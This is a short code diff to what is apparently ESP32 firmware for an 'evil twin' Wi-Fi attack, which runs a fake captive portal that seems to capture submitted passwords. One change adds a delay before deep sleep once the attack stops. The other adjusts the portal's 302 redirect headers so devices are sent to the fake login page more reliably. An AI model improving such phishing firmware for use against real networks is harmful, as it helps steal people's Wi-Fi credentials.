@@ -186,6 +186,7 @@ static esp_err_t save_password_manager(httpd_req_t *req)
 
 		/* Stop attack */
 		evil_twin_stop_attack();
+		vTaskDelay(pdMS_TO_TICKS(1000));
 		/* Enter in deep sleep to preserve battery power */
 		/* Only hardware wakeup (Reset button) */
 		esp_deep_sleep_start();
@@ -271,8 +272,10 @@ static void captive_portal_redirect(httpd_req_t *req)
 	else
 	{
 		httpd_resp_set_status(req, "302 Found");
-		httpd_resp_set_hdr(req, "Host", host);
+		//httpd_resp_set_hdr(req, "Host", host);
 		httpd_resp_set_hdr(req, "Location", CAPTIVE_PORTAL_URL);
+		httpd_resp_set_hdr(req, "Cache-Control", "no-cache");
+		httpd_resp_set_hdr(req, "Content-Length", "0");
 		httpd_resp_send(req, NULL, 0);
 		return;
 	}
